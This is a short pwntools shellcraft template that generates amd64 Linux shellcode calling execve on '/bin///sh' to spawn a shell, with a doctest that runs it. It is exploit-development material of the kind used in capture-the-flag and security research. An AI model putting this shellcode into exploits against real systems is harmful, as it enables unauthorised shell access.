<% from pwnlib.shellcraft import amd64 %>
<%docstring>
Execute a different process.

.. doctest::
   :skipif: not binutils_amd64 or not qemu_amd64

    >>> p = run_assembly(shellcraft.amd64.linux.sh())
    >>> p.sendline('echo Hello')
    >>> p.recv()
    'Hello\n'

</%docstring>
${amd64.linux.execve('/bin///sh', ['sh'], 0)}
